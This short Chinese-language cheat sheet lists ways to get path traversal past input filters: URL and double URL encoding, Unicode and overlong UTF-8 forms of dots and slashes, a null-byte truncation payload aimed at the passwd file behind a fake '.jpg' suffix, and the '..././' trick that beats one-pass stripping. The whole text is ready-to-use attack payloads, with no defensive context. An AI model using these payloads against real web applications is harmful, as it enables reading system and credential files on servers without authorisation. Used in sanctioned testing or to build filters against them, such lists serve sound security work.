# 绕过

## URL编码

```python
..%2F
%2E%2E%2F
```

## 双重URL编码

```python
. = %252e
/ = %252f
\ = %255c
```

## Unicode->URL编码

```python
. = %u002e
/ = %u2215
\ = %u2216
```

## UTF-8->Unicode编码

```python
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

## 超长UTF-8编码

```python
.: %c0%2e, %e0%40%ae, %c0ae
/: %c0%af, %e0%80%af, %c0%2f
\: %c0%5c, %c0%80%5c
```

## 空字节截断

%00截断，用于判断后缀名，使用空字节URL编码绕过

```python
../../../../../passwd%00.jpg
```

## 双重 . . /

仅做一次判断删除或替换 ../情况，可使用 ..././方式绕过

```python
%u002e%u002e%u2215
```
